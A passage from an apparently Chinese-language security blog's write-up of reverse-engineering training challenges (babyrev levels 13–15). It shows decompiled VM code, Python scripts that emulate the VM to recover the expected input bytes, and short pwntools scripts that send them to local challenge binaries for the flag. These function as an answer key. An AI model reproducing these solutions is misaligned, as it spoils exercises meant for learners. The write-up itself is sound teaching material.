<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;/challenge/babyrev-level-13-0&#x27;</span>)</span><br><span class="line">al = [<span class="number">0xbd</span>,<span class="number">0xb5</span>,<span class="number">0xd8</span>,<span class="number">0xdc</span>,<span class="number">0xbd</span>,<span class="number">0x98</span>]</span><br><span class="line"></span><br><span class="line">payload = struct.pack(<span class="string">&#x27;6B&#x27;</span>, *al)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span>(p.readall())</span><br></pre></td></tr></table></figure>

<h4 id="level13-1"><a href="#level13-1" class="headerlink" title="level13.1"></a>level13.1</h4><p>现在，题目不会打印出汇编伪代码了。就得自己通过ida 看出来。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sub_1533</span>(a1, <span class="number">1</span>LL, <span class="number">91</span>LL);			</span><br><span class="line"><span class="attribute">sub_1533</span>(a1, <span class="number">8</span>LL, <span class="number">1</span>LL);			</span><br><span class="line"><span class="attribute">sub_1533</span>(a1, <span class="number">2</span>LL, <span class="number">70</span>LL);			</span><br><span class="line"><span class="attribute">sub_1687</span>(a1, <span class="number">1</span>LL, <span class="number">2</span>LL);			</span><br><span class="line"><span class="attribute">sub_1568</span>(a1, <span class="number">1</span>LL, <span class="number">8</span>LL);			</span><br><span class="line"><span class="attribute">sub_1533</span>(a1, <span class="number">2</span>LL, <span class="number">236</span>LL);</span><br><span class="line"><span class="attribute">sub_1687</span>(a1, <span class="number">1</span>LL, <span class="number">2</span>LL);</span><br><span class="line"><span class="attribute">sub_1568</span>(a1, <span class="number">1</span>LL, <span class="number">8</span>LL);</span><br><span class="line"><span class="attribute">sub_1533</span>(a1, <span class="number">2</span>LL, <span class="number">45</span>LL);</span><br><span class="line"><span class="attribute">sub_1687</span>(a1, <span class="number">1</span>LL, <span class="number">2</span>LL);</span><br><span class="line"><span class="attribute">sub_1568</span>(a1, <span class="number">1</span>LL, <span class="number">8</span>LL);</span><br><span class="line"><span class="attribute">sub_1533</span>(a1, <span class="number">2</span>LL, <span class="number">101</span>LL);</span><br><span class="line"><span class="attribute">sub_1687</span>(a1, <span class="number">1</span>LL, <span class="number">2</span>LL);</span><br><span class="line"><span class="attribute">sub_1568</span>(a1, <span class="number">1</span>LL, <span class="number">8</span>LL);</span><br></pre></td></tr></table></figure>

<p>看了看，要手工调出来得好久，还容易出错。还是写代码快：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">a1 = np.zeros((<span class="number">512</span>,<span class="number">1</span>), dtype=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_1533</span>(<span class="params">a2,a3</span>):</span><br><span class="line">    <span class="keyword">return</span> sub_1415(a2,a3)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_1415</span>(<span class="params">a2, a3</span>):</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">match</span> a2:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            result = a1</span><br><span class="line">            a1[<span class="number">256</span>] = a3</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            result = a1</span><br><span class="line">            a1[<span class="number">257</span>] = a3</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            result = a1</span><br><span class="line">            a1[<span class="number">258</span>] = a3</span><br><span class="line">        <span class="keyword">case</span> <span class="number">32</span>:</span><br><span class="line">            result = a1</span><br><span class="line">            a1[<span class="number">259</span>] = a3</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            result = a1</span><br><span class="line">            a1[<span class="number">260</span>] = a3              </span><br><span class="line">        <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">            result = a1</span><br><span class="line">            a1[<span class="number">261</span>] = a3     </span><br><span class="line">        <span class="keyword">case</span> <span class="number">64</span>:</span><br><span class="line">            result = a1</span><br><span class="line">            a1[<span class="number">262</span>] = a3     </span><br><span class="line">        <span class="keyword">case</span> _:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;unknown register&quot;</span>)</span><br><span class="line">            exit()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_1687</span>(<span class="params">a2, a3</span>):</span><br><span class="line">    v3 = sub_1363(a3)</span><br><span class="line">    v4 = sub_1363(a2)</span><br><span class="line">    <span class="keyword">return</span> sub_1507(v4, v3)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_1363</span>(<span class="params">a2</span>):</span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">match</span> a2:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> a1[<span class="number">256</span>]</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> a1[<span class="number">257</span>]</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            <span class="keyword">return</span> a1[<span class="number">258</span>]</span><br><span class="line">        <span class="keyword">case</span> <span class="number">32</span>:</span><br><span class="line">            <span class="keyword">return</span> a1[<span class="number">259</span>]</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">return</span> a1[<span class="number">260</span>]</span><br><span class="line">        <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">            <span class="keyword">return</span> a1[<span class="number">261</span>]</span><br><span class="line">        <span class="keyword">case</span> <span class="number">64</span>:</span><br><span class="line">            <span class="keyword">return</span> a1[<span class="number">262</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_1507</span>(<span class="params">a2, a3</span>):</span><br><span class="line">    res = a2</span><br><span class="line">    a1[a2] = a3</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_1568</span>(<span class="params">a2, a3</span>):</span><br><span class="line">    v3 = sub_1363(a2)</span><br><span class="line">    v4 = sub_1363(a3)</span><br><span class="line">    <span class="keyword">return</span> sub_1415(a2, v3+v4)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sub_1533(<span class="number">1</span>, <span class="number">91</span>)</span><br><span class="line">sub_1533(<span class="number">8</span>, <span class="number">1</span>)</span><br><span class="line">sub_1533(<span class="number">2</span>, <span class="number">70</span>)</span><br><span class="line">sub_1687(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">sub_1568(<span class="number">1</span>, <span class="number">8</span>)</span><br><span class="line">sub_1533(<span class="number">2</span>, <span class="number">236</span>)</span><br><span class="line">sub_1687(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">sub_1568(<span class="number">1</span>, <span class="number">8</span>)</span><br><span class="line">sub_1533(<span class="number">2</span>, <span class="number">45</span>)</span><br><span class="line">sub_1687(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">sub_1568(<span class="number">1</span>, <span class="number">8</span>)</span><br><span class="line">sub_1533(<span class="number">2</span>, <span class="number">101</span>)</span><br><span class="line">sub_1687(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">sub_1568(<span class="number">1</span>, <span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="built_in">print</span>(a1[<span class="number">91</span>+i])</span><br></pre></td></tr></table></figure>

<p>最后exp就是之前的模板：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;/challenge/babyrev-level-13-1&#x27;</span>)</span><br><span class="line">al = [<span class="number">70</span>,<span class="number">236</span>,<span class="number">45</span>,<span class="number">101</span>]</span><br><span class="line"></span><br><span class="line">payload = struct.pack(<span class="string">&#x27;4B&#x27;</span>, *al)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span>(p.readall())</span><br></pre></td></tr></table></figure>



<h4 id="level14-0"><a href="#level14-0" class="headerlink" title="level14.0"></a>level14.0</h4><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">s</span>] IMM b = <span class="number">0x36</span></span><br><span class="line">[<span class="meta">s</span>] IMM c = <span class="number">0x6</span></span><br><span class="line">[<span class="meta">s</span>] IMM a = <span class="number">0</span></span><br><span class="line">[<span class="meta">s</span>] SYS <span class="number">0x2</span> a</span><br><span class="line">[<span class="meta">s</span>] ... read_memory</span><br><span class="line">[<span class="meta">s</span>] ... <span class="keyword">return</span> <span class="keyword">value</span> (<span class="keyword">in</span> register a): <span class="number">0x2</span></span><br><span class="line">[<span class="meta">s</span>] IMM b = <span class="number">0x56</span></span><br><span class="line">[<span class="meta">s</span>] IMM c = <span class="number">0x1</span></span><br><span class="line">[<span class="meta">s</span>] IMM a = <span class="number">0x14</span></span><br><span class="line">[<span class="meta">s</span>] STM *b = a						<span class="meta"># a1[0x56] = 0x14</span></span><br><span class="line">[<span class="meta">s</span>] ADD b c</span><br><span class="line">[<span class="meta">s</span>] IMM a = <span class="number">0xd2</span></span><br><span class="line">[<span class="meta">s</span>] STM *b = a						<span class="meta"># a1[0x57] = 0xd2</span></span><br><span class="line">[<span class="meta">s</span>] ADD b c</span><br><span class="line">[<span class="meta">s</span>] IMM a = <span class="number">0xcf</span></span><br><span class="line">[<span class="meta">s</span>] STM *b = a						<span class="meta"># a1[0x58] = 0xcf</span></span><br><span class="line">[<span class="meta">s</span>] ADD b c</span><br><span class="line">[<span class="meta">s</span>] IMM a = <span class="number">0x31</span></span><br><span class="line">[<span class="meta">s</span>] STM *b = a						<span class="meta"># a1[0x59] = 0x31</span></span><br><span class="line">[<span class="meta">s</span>] ADD b c</span><br><span class="line">[<span class="meta">s</span>] IMM a = <span class="number">0x54</span></span><br><span class="line">[<span class="meta">s</span>] STM *b = a						<span class="meta"># a1[0x5a] = 0x54</span></span><br><span class="line">[<span class="meta">s</span>] ADD b c</span><br><span class="line">[<span class="meta">s</span>] IMM a = <span class="number">0xb8</span></span><br><span class="line">[<span class="meta">s</span>] STM *b = a						<span class="meta"># a1[0x5b] = 0xb8</span></span><br><span class="line">[<span class="meta">s</span>] ADD b c</span><br></pre></td></tr></table></figure>

<p>老规矩，第一关还是会打印出来。那么我们直接简单推导一下就行了。exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;/challenge/babyrev-level-14-0&#x27;</span>)</span><br><span class="line">al = [<span class="number">0x14</span>,<span class="number">0xd2</span>,<span class="number">0xcf</span>,<span class="number">0x31</span>,<span class="number">0x54</span>,<span class="number">0xb8</span>]</span><br><span class="line"></span><br><span class="line">payload = struct.pack(<span class="string">&#x27;6B&#x27;</span>, *al)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span>(p.readall())</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="level14-1"><a href="#level14-1" class="headerlink" title="level14.1"></a>level14.1</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">a1 = np.zeros((<span class="number">512</span>,<span class="number">1</span>), dtype=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_1533</span>(<span class="params">a2,a3</span>):</span><br><span class="line">    <span class="keyword">return</span> sub_1415(a2,a3)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_1415</span>(<span class="params">a2, a3</span>):</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">match</span> a2:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            result = a1</span><br><span class="line">            a1[<span class="number">256</span>] = a3</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            result = a1</span><br><span class="line">            a1[<span class="number">257</span>] = a3</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            result = a1</span><br><span class="line">            a1[<span class="number">258</span>] = a3</span><br><span class="line">        <span class="keyword">case</span> <span class="number">32</span>:</span><br><span class="line">            result = a1</span><br><span class="line">            a1[<span class="number">259</span>] = a3</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            result = a1</span><br><span class="line">            a1[<span class="number">260</span>] = a3              </span><br><span class="line">        <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">            result = a1</span><br><span class="line">            a1[<span class="number">261</span>] = a3     </span><br><span class="line">        <span class="keyword">case</span> <span class="number">64</span>:</span><br><span class="line">            result = a1</span><br><span class="line">            a1[<span class="number">262</span>] = a3     </span><br><span class="line">        <span class="keyword">case</span> _:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;unknown register&quot;</span>)</span><br><span class="line">            exit()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_1687</span>(<span class="params">a2, a3</span>):</span><br><span class="line">    v3 = sub_1363(a3)</span><br><span class="line">    v4 = sub_1363(a2)</span><br><span class="line">    <span class="keyword">return</span> sub_1507(v4, v3)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_1363</span>(<span class="params">a2</span>):</span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">match</span> a2:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> a1[<span class="number">256</span>]</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> a1[<span class="number">257</span>]</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            <span class="keyword">return</span> a1[<span class="number">258</span>]</span><br><span class="line">        <span class="keyword">case</span> <span class="number">32</span>:</span><br><span class="line">            <span class="keyword">return</span> a1[<span class="number">259</span>]</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">return</span> a1[<span class="number">260</span>]</span><br><span class="line">        <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">            <span class="keyword">return</span> a1[<span class="number">261</span>]</span><br><span class="line">        <span class="keyword">case</span> <span class="number">64</span>:</span><br><span class="line">            <span class="keyword">return</span> a1[<span class="number">262</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_1507</span>(<span class="params">a2, a3</span>):</span><br><span class="line">    res = a2</span><br><span class="line">    a1[a2] = a3</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_1568</span>(<span class="params">a2, a3</span>):</span><br><span class="line">    v3 = sub_1363(a2)</span><br><span class="line">    v4 = sub_1363(a3)</span><br><span class="line">    <span class="keyword">return</span> sub_1415(a2, v3+v4)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># sub_1533(16, 82)</span></span><br><span class="line"><span class="comment"># sub_1533(2, 8)</span></span><br><span class="line"><span class="comment"># sub_1533(8, 0)</span></span><br><span class="line"><span class="comment"># sub_1896(8, 8)</span></span><br><span class="line">sub_1533(<span class="number">16</span>, <span class="number">114</span>)</span><br><span class="line">sub_1533(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">sub_1533(<span class="number">8</span>, <span class="number">97</span>)</span><br><span class="line">sub_1687(<span class="number">16</span>, <span class="number">8</span>)</span><br><span class="line">sub_1568(<span class="number">16</span>, <span class="number">2</span>)</span><br><span class="line">sub_1533(<span class="number">8</span>, <span class="number">170</span>)</span><br><span class="line">sub_1687(<span class="number">16</span>, <span class="number">8</span>)</span><br><span class="line">sub_1568(<span class="number">16</span>, <span class="number">2</span>)</span><br><span class="line">sub_1533(<span class="number">8</span>, <span class="number">239</span>)</span><br><span class="line">sub_1687(<span class="number">16</span>, <span class="number">8</span>)</span><br><span class="line">sub_1568(<span class="number">16</span>, <span class="number">2</span>)</span><br><span class="line">sub_1533(<span class="number">8</span>, <span class="number">133</span>)</span><br><span class="line">sub_1687(<span class="number">16</span>, <span class="number">8</span>)</span><br><span class="line">sub_1568(<span class="number">16</span>, <span class="number">2</span>)</span><br><span class="line">sub_1533(<span class="number">8</span>, <span class="number">167</span>)</span><br><span class="line">sub_1687(<span class="number">16</span>, <span class="number">8</span>)</span><br><span class="line">sub_1568(<span class="number">16</span>, <span class="number">2</span>)</span><br><span class="line">sub_1533(<span class="number">8</span>, <span class="number">205</span>)</span><br><span class="line">sub_1687(<span class="number">16</span>, <span class="number">8</span>)</span><br><span class="line">sub_1568(<span class="number">16</span>, <span class="number">2</span>)</span><br><span class="line">sub_1533(<span class="number">8</span>, <span class="number">70</span>)</span><br><span class="line">sub_1687(<span class="number">16</span>, <span class="number">8</span>)</span><br><span class="line">sub_1568(<span class="number">16</span>, <span class="number">2</span>)</span><br><span class="line">sub_1533(<span class="number">8</span>, <span class="number">226</span>)</span><br><span class="line">sub_1687(<span class="number">16</span>, <span class="number">8</span>)</span><br><span class="line">sub_1568(<span class="number">16</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="built_in">print</span>(a1[<span class="number">114</span>+i])</span><br></pre></td></tr></table></figure>

<p>这里能够注释掉前面几个混淆，因为没起作用。后面的<code>sub_18969()</code>是获取用户输入的。所以不需要写。</p>
<p>最后exp就不贴了，模板还是之前的，然后改一改数字就行了。</p>
<h4 id="level15-0"><a href="#level15-0" class="headerlink" title="level15.0"></a>level15.0</h4><p>道理是一样的，不过这一关的open flag啥的也被做成了函数，也就是后面的<code>if()</code>语句内的。我们只需要关注<code>memcmp()</code>函数以前的vmcode即可。</p>
<h4 id="level15-1"><a href="#level15-1" class="headerlink" title="level15.1"></a>level15.1</h4><p>还是之前的脚本，跑一下，打印出来的整数转成字节序，发给目标程序即可拿到flag。</p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>Lobo Q1ng</span>
                    </p>
                
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2025 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>Hello~,<strong>DESTINY</strong></span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/Pwn/"># Pwn</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2025/03/05/Fuzzilli%EF%BC%9A%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/">Fuzzilli：论文阅读</a>
            
            
            <a class="next" rel="next" href="/2024/08/21/AFL%E4%BD%BF%E7%94%A8%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">AFL使用与源码分析</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>© Lobo Q1ng | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>

</html>